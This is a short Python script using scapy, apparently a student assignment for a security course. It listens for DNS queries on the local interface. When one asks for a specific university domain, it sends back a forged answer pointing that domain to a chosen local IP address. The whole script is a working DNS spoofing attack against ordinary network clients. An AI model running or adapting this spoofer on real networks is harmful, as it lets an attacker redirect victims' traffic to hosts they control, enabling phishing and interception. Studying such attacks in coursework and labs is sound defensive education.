# -----------------------------------------
# task fo security subject - dns sniffer
#
# (C) 2019 Karolina Antonik
# -----------------------------------------
from scapy.all import *
import sys

ip_server = "192.168.11.27"
site = ["student.pwr.edu.pl", '156.17.193.186']
iface = 'en0'

def querysniff(pkt):
        if IP in pkt:
                if pkt.haslayer(DNS) and pkt.haslayer(UDP):
                    ip = pkt['IP']
                    udp = pkt['UDP']
                    dns = pkt['DNS']
                    qname = dns.qd.qname
                    domain = qname[:-1].decode("utf-8")
                    
                    if domain.lower() == site[0]:
                        print("/n------------/n")
                        print("FOUND!!!")
                        
                        # Build the DNS answer
                        dns_answer = DNSRR(
                            rrname=domain, #+ ".",
                            ttl=3600,
                            type="A",
                            rclass="IN",
                            rdata=ip_server)
                        # Build the DNS response by constructing the IP
                        # packet, the UDP "datagram" that goes inside the
                        # packet, and finally the DNS response that goes
                        # inside the datagram.

                        dns_response = \
                            IP(src=ip.dst, dst=ip.src, chksum=None) / \
                            UDP(
                                sport=udp.dport,
                                dport=udp.sport
                            ) / \
                            DNS(
                                id = pkt['DNS'].id,
                                qr = 1,
                                aa = 0,
                                rcode = 0,
                                qd = pkt.qd,
                                an = dns_answer
                            )
                        print("DNS_RESPONSE>SHOW")
                        print(dns_response.show())

                        print("Resolved DNS request for %s to %s for %s" %
                                (domain, ip_server, ip.src))

                        # Use scapy to send response back.
                        #send(dns_response, iface='en0', count=2)
                        send(IP(src=ip.dst, dst=ip.src, chksum=None) / \
                            UDP(
                                sport=udp.dport,
                                dport=udp.sport
                            ) / \
                            DNS(
                                id = pkt['DNS'].id,
                                qr = 1,
                                aa = 0,
                                rcode = 0,
                                qd = pkt.qd,
                                an = dns_answer
                            ))

 
sniff(iface = iface,filter = "port 53", prn = querysniff, store = 0)
print("\n[*] Shutting Down...")